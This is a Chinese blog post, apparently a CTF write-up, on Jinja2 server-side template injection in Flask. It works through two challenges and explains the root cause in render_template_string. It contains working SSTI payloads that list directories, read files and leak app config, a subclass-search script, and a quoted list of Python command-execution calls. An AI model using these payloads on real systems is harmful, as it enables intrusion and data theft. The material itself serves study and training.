<!--yml
category: 未分类
date: 2022-04-26 14:54:14
-->

# web python template injection_CTF引出对Python模板注入的思考_weixin_39630466的博客-CSDN博客

> 来源：[https://blog.csdn.net/weixin_39630466/article/details/111000216](https://blog.csdn.net/weixin_39630466/article/details/111000216)

前记

最近在做ctf的时候碰到了两道跟python模板注入有关的题，在看了网上各位大佬们的解析之后把flag解了出来，但是对原理还是不太清晰，于是心血来潮看了看。

题解

第一题是：Web_python_template_injection

题目如下：

由于题目有提示模板注入，于是尝试构造payload，如下：220.249.52.133:46596/{{1+1}}

发现在URL后出现了1+1的返回值，说明传入的表达式被成功执行，存在模板注入。

但是此时我对模板注入并不了解，仅仅只是知道{{ }}内传入的表达式会被执行，于是决定浅究一下。问题一：为何构造的payload需要使用{{ }}来传入参数？

如果我不在payload中使用{{ }}来传递表达式会怎么样？220.249.52.133:46596/1+1

结果如下：

表达式未被执行，原封不动地被返回，这样就引出了下一个问题，为什么会这样？问题二：此类python网站的大概工作原理是怎样的？

要解决上述两个问题，我需要先选择一个基于python的web框架了解一下，但是在此之前，我需要先回顾一下Web Framework是什么？

Web 服务器的工作原理是什么？

引用一下这位大佬的帖子：

其中我觉得很关键的一句话是这样的：每个页面都以 HTML 的形式传送到你的浏览器中，HTML 是一种浏览器用来描述页面内容和结构的语言。那些负责发送 HTML 到浏览器的应用称之为“Web 服务器”，会让你迷惑的是，这些应用运行的机器通常也叫做 web 服务器。

然而，最重要的是要理解，到最后所有的 web 应用要做的事情就是发送 HTML 到浏览器。不管应用的逻辑多么复杂，最终的结果总是将 HTML 发送到浏览器(我故意将应用可以响应像 JSON 或者 CSS 等不同类型的数据忽略掉，因为在概念上是相同的)。

web 应用如何知道发送什么到浏览器呢？它发送浏览器请求的任何东西。

因为我没有什么网站开发的实际经验，就个人拙见来说，服务器与我们的个人pc之间通过网络通信(可以简单理解为 pc-运营商-服务器，这样一个路线，其实中间的网络传输过程很复杂，之后如果有空再细究一下这个过程...)，网络只是介质，实际通信时我们与服务器之间需要使用一种协议来规范我们的通信，于是我们通过http/https协议来实现与服务器之间的信息交流。

在与服务器端通信时，我们先发送一个请求(get/post方法)告诉服务器端我们需要什么，服务器端接收到我们的请求，判断并执行相应的操作，然后将结果返回给我们。

这个过程就像去商店柜台买东西，我们告诉店员，我们需要一双adidas的球鞋，店员会转身从货架上取下一双给我们，然后我们又告诉店员，我们还需要一双aj11，店员会告诉你没货，对于我们不同的请求，店员会有不同的回应。那么Web框架是什么？到底有啥用？

我个人理解的Web框架，其实是建立一系列的Web应用的模式(或者说格式)。

正如上文所说的，我们的Web应用其实就是对每种不同客户端请求的响应方式，但是这里会涉及到两个重要问题：如何判断每种请求对应的响应方式？

如何动态构造响应的结果返回给客户端，结果中带有计算得到的值或者从数据库中取出来的信息？

我总不能每写一种响应方式就要考虑一次上面的问题吧，那未免也太麻烦了，Web框架就是用来解决上面的问题的(当然其实远不止这些，其中还有各种接口的封装，各种协议的封装，总之就是为了给我们解决开发中的麻烦，只用轻轻松松写响应方式就好，大概...)

解决上述问题的两个办法，就是路由和模板。

由于下一题有用到flask，所以这里我们用flask来举例。flask实现路由方式

在flask中，路由的实现方式主要是通过route()装饰器来实现的，例：from flask import Flask

app = Flask(__name__)

@app.route('/function/')

def test(num):

#...

route后的url中，参数值是以的方式来传递的。

我们可以通过url xxx/function/xxx 来传入num值，访问我们的test方法。

当然，如果是静态页面，直接写上 '/function/xxx.html/' 就好。(ps:记得有看到过网上有帖子说，这里的url如果是写作'/function/xxx.html/ '，在正常访问时无论末尾有无/均可访问，如果url无/，而访问时末尾有/就会报错。)flask实现模板方式

flask和django貌似都是使用templates来实现模板的。

而flask中使用的是Jinja2引擎。

Jinja2引擎存在以下三种语法：控制结构 {% %}

变量取值 {{ }}

注释 {# #}jinja2模板中使用 {{ }} 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等。

问题就出在这里，{{ }}内的内容，Jinja2渲染时不仅仅只进行填充和替换，还能够执行部分表达式。

flask在渲染时主要使用以下两种方法：render_template

render_template_string

render_template用于渲染html文件

而render_template_string用于渲染html语句，当这个html语句是受用户控制的时候，就会出问题了。

例：from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')

def hello_world():

return 'Hello World!'

@app.route('/function/')

def test(num):

print(num)

# ...

@app.route('/function2/')

def test2():

s = request.args.get('code')

html = '

### %s

'%(s)

return render_template_string(html)

# ...

if __name__ == '__main__':

app.run()

构造payload：http://127.0.0.1:5000/function2/?code={{3*2}}

可以看到{{ }}内的表达式被成功执行并返回。

而非{{ }}传递的表达式将不会被执行。

至此，我们解决了上述的问题一和问题二。

接下来我们回到题目本身：问题三：Payload该如何构造？为什么？

因为对python的研究不深，只能用大佬们写好的payload进行分析...

payload如下：{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}

这条payload列出了当前目录下的所有文件。{{''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()}}

这条payload读出了fl4g的文件内容，从而成功拿到flag。

当然拿到flag并不是今天的重点，重点是为什么要这样构造payload。__class__

__class__是python的一个内置属性，指的是某一对象的类属性

例：

__mro__

返回多类的继承顺序。(中间涉及到一些算法和继承特性，不是很了解，待有空补充学习一下。)

例：

注：python2 与python3的类继承有所不同，在接下来的场景复现时，python3中没有找到含有os模块的类方法，故接下来继续使用python2来演示。

例：

选择object类，我们继续往下看。__subclasses__

__subclasses__() 函数获取类的所有子类。

例：

找到一个对象叫filefile.read([size])：从文件读取指定的字节数，如果未给定或为负则读取所有。

可利用此方法读取指定文件内容。

同时我们还需要寻找这些子类中，有哪些初始化方法中包含os模块。(为什么请见下文)num = 0

for n in ''.__class__.__mro__:

print(n)

for item in ''.__class__.__mro__[2].__subclasses__():

try:

if 'os' in item.__init__.__globals__:

print num, item

num += 1

except:

print num, '-'

num += 1

通过上述脚本我们找到两个包含os模块的子类：

为什么我们需要找到包含os模块的子类？

主要跟以下有关：__init__.__globals__

__init__ 是类的初始化方法

__globals__ 而内置的__globals__方法返回全局变量

我们来看看globals返回的全局变量中都有些什么：

此时我们可以看到有一个名叫 'os'的变量，根据描述是一个从python环境中导入的os模块。os模块中都有什么？

os模块主要用于处理文件和文件目录

其中有一个我们下面要用到的函数：返回path指定的文件夹包含的文件或文件夹的名字的列表。

于是我们构造payload：{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}

结合前面我们所说的file.read()函数：{{''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()}}

即可得出解答。

第二题是：shrine

题目如下：

查看源码：

开头import flask

import os

猜测存在模板注入

接着往下看：app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')

config为Flask类中的一个特殊方法，可通过config访问当前Flask中的config对象。

猜测这道题我们需要通过访问config下的‘FLAG’方法来获取flag值。Flask中的特殊变量和方法：https://blog.csdn.net/Enjolras_fuu/article/details/82229073

但是显然，代码中对config和self做了过滤：def safe_jinja(s):

s = s.replace('(', '').replace(')', '')

blacklist = ['config', 'self']

return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

借鉴了网上其他师傅们的解题思路：https://www.cnblogs.com/Cl0ud/p/12316287.html

如下：如果没有黑名单的时候，我们可以使用config，传入 config，或者使用self传入 {{self.__dict__}}

当config,self,()都被过滤的时候，为了获取讯息，我们需要读取一些例如current_app这样的全局变量。

python的沙箱逃逸这里的方法是利用python对象之间的引用关系来调用被禁用的函数对象。

这里有两个函数包含了current_app全局变量，url_for和get_flashed_messages

官方文档：https://flask.palletsprojects.com/en/1.0.x/api/#flask.get_flashed_messages

https://flask.palletsprojects.com/en/1.0.x/api/#flask.url_forbaobaoer.cn/archives/656/python-b2e7b180e9b880e793

于是我们构造payload：/shrine/{{url_for.__globals__['current_app'].config}}

找到其中的的flag。

后记

其实其中还涉及到很多的知识点没有深究，比如Jinja2的工作方式，其中具体是如何渲染模板的

(其实有尝试溯源，最后找到一个compile函数但是没有过程，网上搜了搜，说是由c实现的，就没有继续了

)

还有对于python的各种类继承，魔术方法等，其实payload的构造方法可以有很多。(第二题有尝试过使用第一题的payload格式，但是貌似对__subclasses__方法进行了某种过滤，没有返回其结果也就作罢。)希望以后能多进行一些尝试。

对于os模块来说，os.system这个方法可以达到将shell解析为系统命令执行的效果，但是它无法返回我们命令执行后的结果，需要将结果curl到我们的公网vps上

同时python常用的实现shell的方式不止一种：os.system/os.popen/subprocess详情可见：https://blog.csdn.net/bcfdsagbfcisbg/article/details/78134172?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param

所以这里我们使用os.listdir来代替使用os.system来查找目录下的文件，并用file.read来读取。

引用一下一位大佬对可利用模块和方法的总结：https://blog.csdn.net/Yu_csdnstory/article/details/98040258

Python中可以利用的方法和模块

1.任意代码或者命令执行

_ import _()函数__import__("os").system("ls")

timeit模块import timeit

timeit.timeit("__import__('os').system('ls')",number=1)

exec()，eval()，execfile()，compile()函数eval('__import__("os").system("ls")')

exec("a+1")

compile('a = 1 + 2', '', 'exec')

注意：execfile()只存在于Python2，Python3没有该函数

platform模块import platform

platform.popen('dir').read()

os模块import os

os.system('ls')

os.popen("ls").read()

subprocess模块import subprocess

subprocess.Popen('ls', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()

importlib模块import importlib

importlib.import_module('os').system('ls')

#Python3可以，Python2没有该函数

importlib.__import__('os').system('ls')

2.文件操作

file()函数file('test.txt').read()

#注意：该函数只存在于Python2，Python3不存在

open()函数open('text.txt').read()

codecs模块import codecs

codecs.open('test.txt').read()

结：

大概就是这样，希望后面有时间能继续深究。

小白第一次写文章，不对的地方希望各位师傅大佬指出！